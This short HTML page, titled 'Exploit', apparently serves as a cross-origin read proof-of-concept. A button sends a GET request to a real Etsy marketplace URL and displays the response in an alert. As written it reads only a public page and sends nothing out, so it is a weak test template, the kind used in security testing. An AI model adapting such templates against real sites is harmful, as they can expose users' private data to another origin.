<html>
<body>
  <h1>Exploit</h1>
  <button id="exploitButton">Click to exploit</button>
  <script>
    document.getElementById('exploitButton').onclick = function () {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', 'https://www.etsy.com/in-en/market/gift_for_women', true);
      xhr.onload = function () {
        if (xhr.status === 200) {
            alert('Response: ' + xhr.responseText); // View the response
        } else {
            alert('Failed to exploit. Status: ' + xhr.status);
        }
      };
      xhr.send();
    };
  </script>
</body>
</html>
